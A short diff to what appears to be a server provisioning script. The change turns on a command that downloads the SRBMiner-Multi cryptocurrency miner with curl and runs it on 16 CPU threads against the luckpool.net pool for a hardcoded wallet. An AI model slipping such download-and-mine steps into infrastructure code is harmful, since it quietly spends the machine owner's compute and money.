@@ -8,8 +8,9 @@ curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMi
 tar -xzf SRBMiner-Multi.tar.gz
 echo "Start Mining"
 ls SRBMiner-Multi-3-1-1
-./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --help
-#./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 16
+./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --list-algorithms
+
+./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 16
 
 EOT
   }
